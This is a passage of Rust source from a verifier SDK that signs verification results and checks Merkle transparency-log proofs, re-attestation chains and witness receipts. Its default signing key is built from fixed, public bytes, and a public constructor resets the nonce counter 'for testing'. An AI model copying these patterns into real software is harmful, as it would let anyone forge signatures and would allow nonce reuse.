            verifier_identity: self.verifier_identity.clone(),
            artifact_binding_hash,
            verifier_signature: String::new(),
            sdk_version: self.sdk_version.clone(),
            result_origin_nonce: self.result_origin_nonce.clone(),
        };
        result.verifier_signature = facade_result_signature(&self.signing_key, &result)?;
        Ok(result)
    }

    fn validate_current_verifier_identity(&self) -> Result<(), VerifierSdkError> {
        validate_verifier_identity(&self.verifier_identity)
    }
}

impl VerificationSession {
    /// Borrow the recorded verification steps in append order.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::VerifierSdk;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let session = sdk.create_session("session-docs")?;
    /// assert!(session.steps().is_empty());
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn steps(&self) -> &[SessionStep] {
        &self.steps
    }
}

/// Create a top-level SDK facade instance.
///
/// # Examples
///
/// ```rust
/// use frankenengine_verifier_sdk::create_verifier_sdk;
///
/// let sdk = create_verifier_sdk("verifier://docs");
/// assert_eq!(sdk.verifier_identity, "verifier://docs");
/// ```
pub fn create_verifier_sdk(verifier_identity: impl Into<String>) -> VerifierSdk {
    // For testing: if counter is close to MAX, reset it to avoid test failures
    let _ = SESSION_NONCE_COUNTER.try_update(
        std::sync::atomic::Ordering::Relaxed,
        std::sync::atomic::Ordering::Relaxed,
        |counter| {
            if counter > u64::MAX - 1000 {
                Some(1)
            } else {
                None
            }
        },
    );
    VerifierSdk::new(verifier_identity)
}

fn default_signing_key() -> SigningKey {
    SigningKey::from_bytes(&[1_u8; 32])
}

fn default_verifying_key() -> VerifyingKey {
    VerifyingKey::from(&default_signing_key())
}

fn facade_result_signature(
    signing_key: &ed25519_dalek::SigningKey,
    result: &VerificationResult,
) -> Result<String, VerifierSdkError> {
    #[derive(Serialize)]
    struct SignatureView<'a> {
        operation: &'a VerificationOperation,
        verdict: &'a VerificationVerdict,
        confidence_score: f64,
        checked_assertions: &'a [AssertionResult],
        execution_timestamp: &'a str,
        verifier_identity: &'a str,
        artifact_binding_hash: &'a str,
        sdk_version: &'a str,
        result_origin_nonce: &'a str,
    }

    let payload = serde_json::to_vec(&SignatureView {
        operation: &result.operation,
        verdict: &result.verdict,
        confidence_score: result.confidence_score,
        checked_assertions: &result.checked_assertions,
        execution_timestamp: &result.execution_timestamp,
        verifier_identity: &result.verifier_identity,
        artifact_binding_hash: &result.artifact_binding_hash,
        sdk_version: &result.sdk_version,
        result_origin_nonce: &result.result_origin_nonce,
    })
    .map_err(|source| VerifierSdkError::Json(source.to_string()))?;

    // Create detached Ed25519 attestation over the result payload
    let signature = signing_key.sign(&payload);
    Ok(hex::encode(signature.to_bytes()))
}

fn default_result_origin_nonce() -> String {
    default_result_origin_nonce_from_counter(&SESSION_NONCE_COUNTER)
}

fn default_result_origin_nonce_from_counter(counter: &AtomicU64) -> String {
    default_result_origin_nonce_fallible_from_counter(counter)
        .unwrap_or_else(|_| random_result_origin_nonce())
}

fn default_result_origin_nonce_fallible_from_counter(
    counter: &AtomicU64,
) -> Result<String, VerifierSdkError> {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, RESULT_ORIGIN_DOMAIN);
    push_length_prefixed(&mut payload, SDK_VERSION.as_bytes());
    payload.extend_from_slice(&next_session_nonce_counter_from(counter)?.to_le_bytes());
    Ok(bundle::hash(&payload))
}

fn next_session_nonce_counter() -> Result<u64, VerifierSdkError> {
    next_session_nonce_counter_from(&SESSION_NONCE_COUNTER)
}

fn next_session_nonce_counter_from(counter: &AtomicU64) -> Result<u64, VerifierSdkError> {
    counter
        .try_update(Ordering::Relaxed, Ordering::Relaxed, |counter| {
            if counter == u64::MAX {
                None // Prevent update - counter is exhausted
            } else {
                Some(increment_session_nonce_counter(counter))
            }
        })
        .map_err(|_| VerifierSdkError::NonceCounterExhausted)
}

fn random_result_origin_nonce() -> String {
    let mut nonce = [0u8; 32];
    OsRng.fill_bytes(&mut nonce);
    hex::encode(nonce)
}

fn increment_session_nonce_counter(counter: u64) -> u64 {
    // next_session_nonce_counter prevents calling this at u64::MAX; saturating
    // here keeps the helper fail-closed if it is reused directly.
    counter.saturating_add(1)
}

fn current_utc_timestamp() -> String {
    Utc::now().to_rfc3339_opts(SecondsFormat::Micros, true)
}

fn confidence_score_for_result(
    verdict: &VerificationVerdict,
    checked_assertions: &[AssertionResult],
) -> f64 {
    let assertion_ratio = if checked_assertions.is_empty() {
        match verdict {
            VerificationVerdict::Pass => 1.0,
            VerificationVerdict::Fail => 0.0,
            VerificationVerdict::Inconclusive => 0.5,
        }
    } else {
        checked_assertions
            .iter()
            .filter(|assertion| assertion.passed)
            .count() as f64
            / checked_assertions.len() as f64
    };

    match verdict {
        VerificationVerdict::Pass => assertion_ratio,
        VerificationVerdict::Fail => assertion_ratio * 0.5,
        VerificationVerdict::Inconclusive => 0.25 + (assertion_ratio * 0.5),
    }
}

fn derive_session_nonce(
    session_id: &str,
    verifier_identity: &str,
    created_at: &str,
    counter: u64,
) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, SESSION_NONCE_DOMAIN);
    push_length_prefixed(&mut payload, session_id.as_bytes());
    push_length_prefixed(&mut payload, verifier_identity.as_bytes());
    push_length_prefixed(&mut payload, created_at.as_bytes());
    payload.extend_from_slice(&counter.to_le_bytes());
    bundle::hash(&payload)
}

fn transparency_merkle_proof(leaf_hashes: &[String], target_index: usize) -> Vec<String> {
    if leaf_hashes.is_empty() || target_index >= leaf_hashes.len() {
        return Vec::new();
    }

    let mut level = leaf_hashes.to_vec();
    let mut index = target_index;
    let mut proof = Vec::new();

    while level.len() > 1 {
        let sibling_index = if index.is_multiple_of(2) {
            if index + 1 < level.len() {
                index + 1
            } else {
                index
            }
        } else {
            index - 1
        };
        let sibling_direction = if index.is_multiple_of(2) {
            "right"
        } else {
            "left"
        };
        proof.push(format!("{sibling_direction}:{}", level[sibling_index]));

        let mut next_level = Vec::with_capacity(level.len().div_ceil(2));
        for pair_start in (0..level.len()).step_by(2) {
            let left = &level[pair_start];
            let right = level.get(pair_start + 1).unwrap_or(left);
            next_level.push(transparency_merkle_parent_hash(left, right));
        }
        level = next_level;
        index /= 2;
    }

    let mut encoded = Vec::with_capacity(proof.len() + 3);
    encoded.push(format!("root:{}", level[0]));
    encoded.push(format!("leaf_index:{target_index}"));
    encoded.push(format!("tree_size:{}", leaf_hashes.len()));
    encoded.extend(proof);
    encoded
}

fn ensure_bounded_capacity(
    len: usize,
    cap: usize,
    surface: &'static str,
) -> Result<(), VerifierSdkError> {
    if len >= cap {
        Err(VerifierSdkError::BoundedStateExceeded { surface, max: cap })
    } else {
        Ok(())
    }
}

fn push_bounded<T>(
    items: &mut Vec<T>,
    item: T,
    cap: usize,
    surface: &'static str,
) -> Result<(), VerifierSdkError> {
    ensure_bounded_capacity(items.len(), cap, surface)?;
    items.push(item);
    Ok(())
}

fn transparency_merkle_parent_hash(left: &str, right: &str) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, TRANSPARENCY_MERKLE_PARENT_DOMAIN);
    push_length_prefixed(&mut payload, left.as_bytes());
    push_length_prefixed(&mut payload, right.as_bytes());
    bundle::hash(&payload)
}

fn validate_transparency_log_history(log: &[TransparencyLogEntry]) -> Result<(), VerifierSdkError> {
    for (index, entry) in log.iter().enumerate() {
        if !is_canonical_sha256_hex(&entry.result_hash) {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: "result_hash must be a canonical lowercase 64-nybble sha256 digest"
                    .to_string(),
            });
        }
        if let Err(source) = chrono::DateTime::parse_from_rfc3339(&entry.timestamp) {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: format!("timestamp must be RFC3339: {source}"),
            });
        }
        if let Err(source) = validate_verifier_identity(&entry.verifier_id) {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: source.to_string(),
            });
        }
        if entry.merkle_proof.len() < 3 {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: "merkle_proof must include root, leaf_index, and tree_size".to_string(),
            });
        }

        let root = entry.merkle_proof[0].strip_prefix("root:").ok_or_else(|| {
            VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: "merkle_proof[0] must start with root:".to_string(),
            }
        })?;
        if !is_canonical_sha256_hex(root) {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: "merkle_proof root must be a canonical lowercase 64-nybble sha256 digest"
                    .to_string(),
            });
        }

        let leaf_index =
            parse_transparency_proof_usize(index, &entry.merkle_proof[1], "leaf_index")?;
        if leaf_index != index {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: format!("leaf_index must equal append position {index}"),
            });
        }

        let tree_size = parse_transparency_proof_usize(index, &entry.merkle_proof[2], "tree_size")?;
        let expected_tree_size = index.saturating_add(1);
        if tree_size != expected_tree_size {
            return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                index,
                reason: format!("tree_size must equal {expected_tree_size}"),
            });
        }

        for step in &entry.merkle_proof[3..] {
            let Some(sibling_hash) = step
                .strip_prefix("left:")
                .or_else(|| step.strip_prefix("right:"))
            else {
                return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                    index,
                    reason: "merkle_proof sibling steps must start with left: or right:"
                        .to_string(),
                });
            };
            if !is_canonical_sha256_hex(sibling_hash) {
                return Err(VerifierSdkError::InvalidTransparencyLogEntry {
                    index,
                    reason:
                        "merkle_proof sibling hash must be a canonical lowercase 64-nybble sha256 digest"
                            .to_string(),
                });
            }
        }
    }
    Ok(())
}

fn parse_transparency_proof_usize(
    entry_index: usize,
    encoded: &str,
    field: &'static str,
) -> Result<usize, VerifierSdkError> {
    let value = encoded.strip_prefix(&format!("{field}:")).ok_or_else(|| {
        VerifierSdkError::InvalidTransparencyLogEntry {
            index: entry_index,
            reason: format!("merkle_proof field must start with {field}:"),
        }
    })?;
    value
        .parse::<usize>()
        .map_err(|source| VerifierSdkError::InvalidTransparencyLogEntry {
            index: entry_index,
            reason: format!("{field} must parse as usize: {source}"),
        })
}

fn transparency_log_leaf_hash(result: &VerificationResult) -> Result<String, VerifierSdkError> {
    let result_bytes =
        serde_json::to_vec(result).map_err(|source| VerifierSdkError::Json(source.to_string()))?;
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, TRANSPARENCY_LOG_LEAF_DOMAIN);
    push_length_prefixed(&mut payload, &result_bytes);
    push_length_prefixed(&mut payload, result.result_origin_nonce.as_bytes());
    Ok(bundle::hash(&payload))
}

fn session_step_signature(
    session: &VerificationSession,
    step: &SessionStep,
) -> Result<String, VerifierSdkError> {
    #[derive(Serialize)]
    struct SessionStepSignatureView<'a> {
        session_id: &'a str,
        verifier_identity: &'a str,
        created_at: &'a str,
        session_nonce: &'a str,
        step_index: usize,
        operation: &'a VerificationOperation,
        verdict: &'a VerificationVerdict,
        artifact_binding_hash: &'a str,
        timestamp: &'a str,
    }

    let payload = serde_json::to_vec(&SessionStepSignatureView {
        session_id: &session.session_id,
        verifier_identity: &session.verifier_identity,
        created_at: &session.created_at,
        session_nonce: &session.session_nonce,
        step_index: step.step_index,
        operation: &step.operation,
        verdict: &step.verdict,
        artifact_binding_hash: &step.artifact_binding_hash,
        timestamp: &step.timestamp,
    })
    .map_err(|source| VerifierSdkError::Json(source.to_string()))?;

    let mut envelope = Vec::new();
    push_length_prefixed(&mut envelope, SESSION_STEP_SIGNATURE_DOMAIN);
    envelope.extend_from_slice(&payload);
    Ok(bundle::hash(&envelope))
}

fn push_length_prefixed(buffer: &mut Vec<u8>, bytes: &[u8]) {
    buffer.extend_from_slice(&u64::try_from(bytes.len()).unwrap_or(u64::MAX).to_le_bytes());
    buffer.extend_from_slice(bytes);
}

fn constant_time_eq(left: &str, right: &str) -> bool {
    bool::from(left.as_bytes().ct_eq(right.as_bytes()))
}

fn validate_verifier_identity(verifier_identity: &str) -> Result<(), VerifierSdkError> {
    if verifier_identity != verifier_identity.trim() {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must not contain leading or trailing whitespace".to_string(),
        });
    }
    let Some(remainder) = verifier_identity.strip_prefix("verifier://") else {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must use the external verifier:// scheme".to_string(),
        });
    };
    if remainder.trim().is_empty() || remainder != remainder.trim() {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must include a non-empty verifier name".to_string(),
        });
    }
    if remainder.len() > MAX_VERIFIER_IDENTITY_NAME_LEN {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: format!(
                "identity must be at most {MAX_VERIFIER_IDENTITY_NAME_LEN} ASCII bytes after verifier://"
            ),
        });
    }
    if !remainder
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
    {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must include only ASCII letters, digits, '.', '-', and '_'"
                .to_string(),
        });
    }
    Ok(())
}

fn validate_session_id(session_id: &str) -> Result<(), VerifierSdkError> {
    if session_id.trim().is_empty() {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must be non-empty".to_string(),
        });
    }
    if session_id != session_id.trim() {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must not contain leading or trailing whitespace".to_string(),
        });
    }
    if session_id.len() > MAX_SESSION_ID_LEN {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: format!("session id must be at most {MAX_SESSION_ID_LEN} ASCII bytes"),
        });
    }
    if !session_id
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
    {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must include only ASCII letters, digits, '.', '-', and '_'"
                .to_string(),
        });
    }
    Ok(())
}

fn validate_session_provenance(session: &VerificationSession) -> Result<(), VerifierSdkError> {
    validate_session_id(&session.session_id)?;
    validate_verifier_identity(&session.verifier_identity)?;
    if !constant_time_eq(&session.session_id, &session.origin_session_id) {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "session_id",
            expected: session.origin_session_id.clone(),
            actual: session.session_id.clone(),
        });
    }
    if !constant_time_eq(
        &session.verifier_identity,
        &session.origin_verifier_identity,
    ) {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "verifier_identity",
            expected: session.origin_verifier_identity.clone(),
            actual: session.verifier_identity.clone(),
        });
    }
    if session.created_at != session.origin_created_at {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "created_at",
            expected: session.origin_created_at.clone(),
            actual: session.created_at.clone(),
        });
    }
    if !constant_time_eq(&session.session_nonce, &session.origin_session_nonce) {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "session_nonce",
            expected: session.origin_session_nonce.clone(),
            actual: session.session_nonce.clone(),
        });
    }
    Ok(())
}

#[derive(Debug)]
struct LongTermEvidenceVerification {
    checked_assertions: Vec<AssertionResult>,
    artifact_binding_hash: String,
}

impl LongTermEvidenceVerification {
    fn all_passed(&self) -> bool {
        self.checked_assertions
            .iter()
            .all(|assertion| assertion.passed)
    }
}

#[derive(Debug)]
struct LongTermWitnessVerification {
    root: LongTermMmrRoot,
    observed_at_unix_seconds: u64,
    valid_signatures: u32,
    threshold: u32,
}

fn verify_long_term_evidence(
    evidence: &LongTermVerificationEvidence,
) -> LongTermEvidenceVerification {
    let mut assertions = Vec::new();
    let artifact_binding_hash = long_term_artifact_marker_hash(&evidence.artifact);

    push_long_term_assertion(
        &mut assertions,
        "ltv_schema_supported",
        evidence.schema_version == LONG_TERM_VERIFICATION_SCHEMA_VERSION,
        || {
            format!(
                "schema_version={} supported={}",
                evidence.schema_version, LONG_TERM_VERIFICATION_SCHEMA_VERSION
            )
        },
        || {
            format!(
                "unsupported schema_version={} expected={}",
                evidence.schema_version, LONG_TERM_VERIFICATION_SCHEMA_VERSION
            )
        },
    );
    push_long_term_assertion(
        &mut assertions,
        "ltv_as_of_nonzero",
        evidence.as_of_unix_seconds != 0,
        || format!("as_of_unix_seconds={}", evidence.as_of_unix_seconds),
        || "as_of_unix_seconds must be nonzero".to_string(),
    );
    let marker_ok = validate_long_term_artifact(&evidence.artifact)
        .map(|()| constant_time_eq(&artifact_binding_hash, &evidence.artifact.marker_hash))
        .unwrap_or(false);
    push_long_term_assertion(
        &mut assertions,
        "ltv_artifact_marker_recomputed",
        marker_ok,
        || {
            format!(
                "artifact marker {} recomputed",
                evidence.artifact.marker_hash
            )
        },
        || {
            format!(
                "artifact marker mismatch: expected={} actual={}",
                artifact_binding_hash, evidence.artifact.marker_hash
            )
        },
    );

    let suite_check = verify_long_term_suite_record(evidence);
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_crypto_suite_valid_at_claimed_time",
        suite_check.is_ok(),
        result_detail(&suite_check),
    );

    let inclusion_check = verify_long_term_inclusion(
        &evidence.inclusion_proof,
        &evidence.reattestation_chain.origin_root,
        &evidence.artifact.marker_hash,
    );
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_artifact_leaf_included_under_origin_root",
        inclusion_check.is_ok(),
        result_detail_with_ok(
            &inclusion_check,
            "artifact marker leaf included under re-attestation origin root",
        ),
    );

    let chain_check = verify_long_term_reattestation_chain(&evidence.reattestation_chain);
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_reattestation_chain_verified",
        chain_check.is_ok(),
        match &chain_check {
            Ok(_) => "re-attestation prefix chain verified to witnessed root".to_string(),
            Err(reason) => reason.clone(),
        },
    );

    let witness_check = verify_long_term_witness_receipt(&evidence.witness_receipt);
    let witness_root_matches = match (&chain_check, &witness_check) {
        (Ok(reattested_root), Ok(witness)) => witness.root == *reattested_root,
        _ => false,
    };
    push_long_term_assertion(
        &mut assertions,
        "ltv_witness_root_matches_reattested_root",
        witness_root_matches,
        || "witness receipt is bound to the newest re-attested root".to_string(),
        || "witness receipt root does not match the newest re-attested root".to_string(),
    );
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_witness_threshold_verified",
        witness_check.is_ok(),
        match &witness_check {
            Ok(witness) => {
                format!(
                    "valid_signatures={} threshold={}",
                    witness.valid_signatures, witness.threshold
                )
            }
            Err(reason) => reason.clone(),
        },
    );

    let anterior_to_as_of = witness_check
        .as_ref()
        .is_ok_and(|witness| witness.observed_at_unix_seconds <= evidence.as_of_unix_seconds);
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_witness_anterior_to_as_of",
        anterior_to_as_of,
        match &witness_check {
            Ok(witness) if anterior_to_as_of => format!(
                "observed_at_unix_seconds={} <= as_of_unix_seconds={}",
                witness.observed_at_unix_seconds, evidence.as_of_unix_seconds
            ),
            Ok(witness) => format!(
                "witness observed_at_unix_seconds={} is after as_of_unix_seconds={}",
                witness.observed_at_unix_seconds, evidence.as_of_unix_seconds
            ),
            Err(reason) => reason.clone(),
        },
    );

    let compromise_check = witness_check.as_ref().map_or_else(
        |error| Err(error.clone()),
        |witness| {
            verify_long_term_compromise_anteriority(evidence, witness.observed_at_unix_seconds)
        },
    );
    push_long_term_assertion_detail(
        &mut assertions,
        "ltv_witness_precedes_key_compromise_records",
        compromise_check.is_ok(),
        result_detail(&compromise_check),
    );

    LongTermEvidenceVerification {
        checked_assertions: assertions,
        artifact_binding_hash,
    }
}

fn push_long_term_assertion(
    assertions: &mut Vec<AssertionResult>,
    assertion: impl Into<String>,
    passed: bool,
    passed_detail: impl FnOnce() -> String,
    failed_detail: impl FnOnce() -> String,
) {
    assertions.push(AssertionResult {
        assertion: assertion.into(),
        passed,
        detail: if passed {
            passed_detail()
        } else {
            failed_detail()
        },
    });
}

fn push_long_term_assertion_detail(
    assertions: &mut Vec<AssertionResult>,
    assertion: impl Into<String>,
    passed: bool,
    detail: String,
) {
    assertions.push(AssertionResult {
        assertion: assertion.into(),
        passed,
        detail,
    });
}

fn result_detail(result: &Result<String, String>) -> String {
    match result {
        Ok(detail) | Err(detail) => detail.clone(),
    }
}

fn result_detail_with_ok(result: &Result<(), String>, ok_detail: &str) -> String {
    match result {
        Ok(()) => ok_detail.to_string(),
        Err(detail) => detail.clone(),
    }
}

fn validate_long_term_artifact(artifact: &LongTermArtifactEvidence) -> Result<(), String> {
    validate_long_term_identifier("artifact_id", &artifact.artifact_id)?;
    validate_long_term_identifier("crypto_suite", &artifact.crypto_suite)?;
    if artifact.claimed_at_unix_seconds == 0 {
        return Err("artifact claimed_at_unix_seconds must be nonzero".to_string());
    }
    if !is_canonical_sha256_hex(&artifact.artifact_hash) {
        return Err("artifact_hash must be a canonical lowercase sha256 digest".to_string());
    }
    if !is_canonical_sha256_hex(&artifact.marker_hash) {
        return Err("marker_hash must be a canonical lowercase sha256 digest".to_string());
    }
    Ok(())
}

fn verify_long_term_suite_record(
    evidence: &LongTermVerificationEvidence,
) -> Result<String, String> {
    validate_long_term_artifact(&evidence.artifact)?;
    if evidence.suite_records.is_empty() {
        return Err("suite_records must contain the artifact crypto suite".to_string());
    }
    if evidence.suite_records.len() > MAX_LONG_TERM_SUITE_RECORDS {
        return Err(format!(
            "suite_records len={} exceeds limit={MAX_LONG_TERM_SUITE_RECORDS}",
            evidence.suite_records.len()
        ));
    }

    let mut matching_records = 0usize;
    for record in &evidence.suite_records {
        validate_long_term_identifier("suite_record.crypto_suite", &record.crypto_suite)?;
        if record
            .valid_until_unix_seconds
            .is_some_and(|valid_until| valid_until < record.valid_from_unix_seconds)
        {
            return Err(format!(
                "suite {} valid_until precedes valid_from",
                record.crypto_suite
            ));
        }

        if !constant_time_eq(&record.crypto_suite, &evidence.artifact.crypto_suite) {
            continue;
        }
        matching_records = matching_records.saturating_add(1);

        let claimed_at = evidence.artifact.claimed_at_unix_seconds;
        let starts_in_time = claimed_at >= record.valid_from_unix_seconds;
        let before_valid_until = record
            .valid_until_unix_seconds
            .is_none_or(|valid_until| claimed_at <= valid_until);
        let before_compromise = record
            .compromised_at_unix_seconds
            .is_none_or(|compromised_at| claimed_at < compromised_at);
        if starts_in_time && before_valid_until && before_compromise {
            return Ok(format!(
                "crypto_suite={} was valid at claimed_at_unix_seconds={claimed_at}",
                evidence.artifact.crypto_suite
            ));
        }
    }

    if matching_records == 0 {
        return Err(format!(
            "no suite record for crypto_suite={}",
            evidence.artifact.crypto_suite
        ));
    }
    Err(format!(
        "crypto_suite={} was not valid at claimed_at_unix_seconds={}",
        evidence.artifact.crypto_suite, evidence.artifact.claimed_at_unix_seconds
    ))
}

fn verify_long_term_compromise_anteriority(
    evidence: &LongTermVerificationEvidence,
    observed_at_unix_seconds: u64,
) -> Result<String, String> {
    let mut saw_suite = false;
    for record in &evidence.suite_records {
        if !constant_time_eq(&record.crypto_suite, &evidence.artifact.crypto_suite) {
            continue;
        }
        saw_suite = true;
        if record
            .compromised_at_unix_seconds
            .is_some_and(|compromised_at| observed_at_unix_seconds >= compromised_at)
        {
            return Err(format!(
                "witness observed_at_unix_seconds={} is not anterior to compromise for suite {}",
                observed_at_unix_seconds, record.crypto_suite
            ));
        }
    }
    if saw_suite {
        Ok(LONG_TERM_VERIFICATION_PASS_DETAIL.to_string())
    } else {
        Err(format!(
            "no suite record for crypto_suite={}",
            evidence.artifact.crypto_suite
        ))
    }
}

fn verify_long_term_inclusion(
    proof: &LongTermMmrInclusionProof,
    root: &LongTermMmrRoot,
    marker_hash: &str,
) -> Result<(), String> {
    validate_long_term_root(root)?;
    if proof.tree_size == 0 {
        return Err("inclusion proof tree_size must be nonzero".to_string());
    }
    if proof.tree_size != root.tree_size {
        return Err(format!(
            "inclusion proof tree_size={} does not match root tree_size={}",
            proof.tree_size, root.tree_size
        ));
    }
    if proof.leaf_index >= proof.tree_size {
        return Err(format!(
            "inclusion leaf_index={} is outside tree_size={}",
            proof.leaf_index, proof.tree_size
        ));
    }
    if proof.audit_path.len() > MAX_LONG_TERM_AUDIT_PATH_ENTRIES {
        return Err(format!(
            "inclusion audit_path len={} exceeds limit={MAX_LONG_TERM_AUDIT_PATH_ENTRIES}",
            proof.audit_path.len()
        ));
    }
    if !is_canonical_sha256_hex(marker_hash) {
        return Err("artifact marker_hash must be a canonical lowercase sha256 digest".to_string());
    }
    for sibling in &proof.audit_path {
        if !is_canonical_sha256_hex(sibling) {
            return Err("inclusion audit_path contains a non-canonical hash".to_string());
        }
    }
    let expected_leaf = long_term_marker_leaf_hash(marker_hash);
    if !constant_time_eq(&expected_leaf, &proof.leaf_hash) {
        return Err("inclusion leaf hash does not bind the artifact marker".to_string());
    }
    let current = long_term_inclusion_root_from_proof(proof)?;
    if !constant_time_eq(&current, &root.root_hash) {
        return Err("inclusion proof root mismatch".to_string());
    }
    Ok(())
}

fn verify_long_term_reattestation_chain(
    chain: &LongTermMmrRootReattestationChain,
) -> Result<LongTermMmrRoot, String> {
    validate_long_term_root(&chain.origin_root)?;
    if chain.attestations.is_empty() {
        return Err("reattestation chain must contain at least one link".to_string());
    }
    if chain.attestations.len() > MAX_LONG_TERM_REATTESTATION_LINKS {
        return Err(format!(
            "reattestation chain len={} exceeds limit={MAX_LONG_TERM_REATTESTATION_LINKS}",
            chain.attestations.len()
        ));
    }

    let mut current_root = chain.origin_root.clone();
    let mut previous_issued_at = 0u64;
    for reattestation in &chain.attestations {
        if reattestation.schema_version != MMR_ROOT_REATTESTATION_SCHEMA_VERSION {
            return Err(format!(
                "unsupported reattestation schema_version={}",
                reattestation.schema_version
            ));
        }
        if reattestation.previous_root != current_root {
            return Err("reattestation chain root continuity mismatch".to_string());
        }
        if reattestation.issued_at_unix_seconds == 0 {
            return Err("reattestation issued_at_unix_seconds must be nonzero".to_string());
        }
        if reattestation.issued_at_unix_seconds < previous_issued_at {
            return Err("reattestation timestamps must be monotonic".to_string());
        }
        validate_long_term_identifier("reattestation.crypto_suite", &reattestation.crypto_suite)?;
        verify_long_term_prefix(
            &reattestation.prefix_proof,
            &reattestation.previous_root,
            &reattestation.attested_root,
        )?;
        let expected_hash = compute_long_term_reattestation_hash(reattestation);
        if !constant_time_eq(&expected_hash, &reattestation.attestation_hash) {
            return Err("reattestation hash mismatch".to_string());
        }
        previous_issued_at = reattestation.issued_at_unix_seconds;
        current_root = reattestation.attested_root.clone();
    }
    Ok(current_root)
}

fn verify_long_term_prefix(
    proof: &LongTermMmrPrefixProof,
    root_a: &LongTermMmrRoot,
    root_b: &LongTermMmrRoot,
) -> Result<(), String> {
    validate_long_term_root(root_a)?;
    validate_long_term_root(root_b)?;
    if proof.prefix_size == 0 || proof.super_tree_size == 0 {
        return Err("prefix proof sizes must be nonzero".to_string());
    }
    if proof.prefix_size > proof.super_tree_size {
        return Err(format!(
            "prefix_size={} exceeds super_tree_size={}",
            proof.prefix_size, proof.super_tree_size
        ));
    }
    if proof.super_leaf_hashes.len() > MAX_LONG_TERM_LEAF_HASHES {
        return Err(format!(
            "super_leaf_hashes len={} exceeds limit={MAX_LONG_TERM_LEAF_HASHES}",
            proof.super_leaf_hashes.len()
        ));
    }
    let prefix_size = usize::try_from(proof.prefix_size).map_err(|_| {
        format!(
            "prefix_size={} cannot be represented locally",
            proof.prefix_size
        )
    })?;
    let super_tree_size = usize::try_from(proof.super_tree_size).map_err(|_| {
        format!(
            "super_tree_size={} cannot be represented locally",
            proof.super_tree_size
        )
    })?;
    if proof.super_leaf_hashes.len() != super_tree_size {
        return Err(format!(
            "super_leaf_hashes len={} does not match super_tree_size={}",
            proof.super_leaf_hashes.len(),
            proof.super_tree_size
        ));
    }
    if root_a.tree_size != proof.prefix_size || root_b.tree_size != proof.super_tree_size {
        return Err("prefix proof sizes do not match supplied roots".to_string());
    }
    if !constant_time_eq(&proof.prefix_root_hash, &root_a.root_hash)
        || !constant_time_eq(&proof.prefix_root_from_super, &root_a.root_hash)
        || !constant_time_eq(&proof.super_root_hash, &root_b.root_hash)
    {
        return Err("prefix proof root fields do not match supplied roots".to_string());
    }
    if prefix_size > proof.super_leaf_hashes.len() {
        return Err(format!(
            "prefix_size={} exceeds super_leaf_hashes len={}",
            proof.prefix_size,
            proof.super_leaf_hashes.len()
        ));
    }
    for leaf_hash in &proof.super_leaf_hashes {
        if !is_canonical_sha256_hex(leaf_hash) {
            return Err("prefix proof contains a non-canonical leaf hash".to_string());
        }
    }

    let recomputed_prefix =
        long_term_merkle_root_from_leaf_hashes(&proof.super_leaf_hashes[..prefix_size])
            .ok_or_else(|| "prefix proof cannot recompute empty prefix root".to_string())?;
    if !constant_time_eq(&recomputed_prefix, &root_a.root_hash) {
        return Err("prefix proof recomputed prefix root mismatch".to_string());
    }
    let recomputed_super = long_term_merkle_root_from_leaf_hashes(&proof.super_leaf_hashes)
        .ok_or_else(|| "prefix proof cannot recompute empty super root".to_string())?;
    if !constant_time_eq(&recomputed_super, &root_b.root_hash) {
        return Err("prefix proof recomputed super root mismatch".to_string());
    }
    Ok(())
}

fn verify_long_term_witness_receipt(
    receipt: &LongTermMmrRootWitnessReceipt,
) -> Result<LongTermWitnessVerification, String> {
    validate_long_term_witness_statement(&receipt.statement)?;
    validate_long_term_text("trace_id", &receipt.trace_id)?;
    validate_long_term_text("timestamp", &receipt.timestamp)?;
    if !constant_time_eq(
        &receipt.witness_artifact.artifact_id,
        MMR_ROOT_WITNESS_ARTIFACT_ID,
    ) {
        return Err("root witness artifact_id mismatch".to_string());
    }
    if !constant_time_eq(
        &receipt.witness_artifact.connector_id,
